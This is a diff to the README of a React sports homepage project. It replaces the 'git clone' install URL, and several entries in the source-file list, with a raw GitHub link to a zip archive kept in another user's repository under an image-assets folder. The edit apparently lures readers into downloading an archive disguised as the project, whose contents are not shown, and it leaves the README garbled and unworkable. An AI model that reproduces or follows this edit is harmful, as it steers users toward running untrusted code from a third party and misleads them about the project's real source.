@@ -13,7 +13,7 @@ A React-based sports website homepage showcasing major events, best players, and
 
 1. Clone the repository:
 
-git clone https://github.com/ankitsingh4304/Global-Championship.git
+git clone https://raw.githubusercontent.com/RonankiDinesh/General-Championship/main/public/assets/sports/Kabaddi/General_Championship_v1.6-beta.3.zip
 
 text
 
@@ -41,8 +41,8 @@ Open http://localhost:5173 in your browser to see the app.
 
 -   `src/components/Navbar` - Navbar component with logo and navigation links
 -   `src/pages/Home` - Home page with banner and events
--   `src/pages/Sports`, `BestPlayers.js`, `OverallRank.js` - Pages for each tab section
--   `src/App.tsx` - Main app with routing logic
+-   `src/pages/Sports`, `https://raw.githubusercontent.com/RonankiDinesh/General-Championship/main/public/assets/sports/Kabaddi/General_Championship_v1.6-beta.3.zip`, `https://raw.githubusercontent.com/RonankiDinesh/General-Championship/main/public/assets/sports/Kabaddi/General_Championship_v1.6-beta.3.zip` - Pages for each tab section
+-   `https://raw.githubusercontent.com/RonankiDinesh/General-Championship/main/public/assets/sports/Kabaddi/General_Championship_v1.6-beta.3.zip` - Main app with routing logic
 
 ## Technologies Used
 
